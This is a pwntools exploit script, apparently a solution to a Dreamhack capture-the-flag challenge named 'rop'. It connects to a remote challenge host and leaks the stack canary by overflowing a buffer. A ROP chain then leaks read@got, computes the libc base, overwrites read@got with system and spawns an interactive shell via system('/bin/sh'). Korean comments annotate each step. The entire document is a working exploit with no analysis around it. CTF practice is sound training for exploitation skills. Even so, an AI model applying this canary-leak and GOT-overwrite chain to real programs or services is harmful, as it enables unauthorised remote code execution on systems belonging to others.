from pwn import *

context.log_level = 'debug'

def slog(name, addr):
	return success(": ".join([name, hex(addr)]))


p = remote("host2.dreamhack.games", 15620)
e = ELF("./rop")
libc = ELF("./libc-2.27.so")
r = ROP(e)



# [1] Leak Canary
buf = b'A'*57
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)



# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

payload = b'A'*56 + p64(canary) + b'B'*8


# puts(read@got)
payload += p64(pop_rdi) + p64(read_got)	# puts(read@got)
payload += p64(puts_plt)	# puts(read@got) 호출


# read(0, read@got, 0) => read@got -> system
payload += p64(pop_rdi) + p64(0)	# read(0, , )
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)	# read(0, read@got, 0)
payload += p64(read_plt)	# read(0, read@got, 0) 호출


# read("/bin/sh") => system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)	# read 함수의 첫번째 인자 값 ("/bin/sh")
payload += p64(read_plt)	# read("/bin/sh") 호출


p.sendafter("Buf: ", payload)	# puts()와 read got를 이용해서 read() 주소 출력
read = u64(p.recvn(6)+b'\x00'*2)	# 화면에 출력된 read() 주소를 read에 대입
lb = read - libc.symbols["read"]	# libc base = read 주소 - read symbols
system = lb + libc.symbols["system"]	# system = libc base + system symbols

slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.send(p64(system)+b"/bin/sh\x00")

p.interactive()
